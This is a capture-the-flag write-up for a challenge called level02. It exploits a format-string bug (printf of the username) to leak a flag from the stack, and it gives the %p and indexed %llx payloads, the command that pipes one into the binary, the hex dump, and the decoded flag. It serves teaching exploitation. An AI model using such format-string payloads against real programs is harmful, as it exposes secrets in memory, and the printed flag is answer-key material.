# level02

The executable reads the flag, and prompts for a username and a password. If the password is incorrect (not equal to the flag), it does a `printf(username)`.

Since the flag is in memory, and we control the `printf`, we'll exploit it to show the stack

## **The exploit**

We start by dumping memory using something like `%p%p%p%p%p %p%p%p%p%p %p%p%p%p%p %p%p%p%p%p %p%p%p%p%p` as username.

The `22nd %p` and onward shows unknown, printable characters (we see that by checking against an ascii table). This is most likely our flag.

To see it clearly, we do a few things :

- Use indexing, to only get elements `22-26`
- Reverse the order (`26->22`) to account for endianness (we'll reverse again later)
- Use `%x`, to get rid of the `0x`

We run the following command :

```
echo '%26$llx%25$llx%24$llx%23$llx%22$llx' | ./level02
```

We get our memory dump :

```
48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848
```

## **The flag**

Now, we use an [hex to ascii](https://www.rapidtables.com/convert/number/hex-to-ascii.html) converter to get our string :

```
H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH
```

Finally, accounting for endianness again, we [reverse](https://codebeautify.org/reverse-string) our string, this time getting the `level02` flag :

```
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```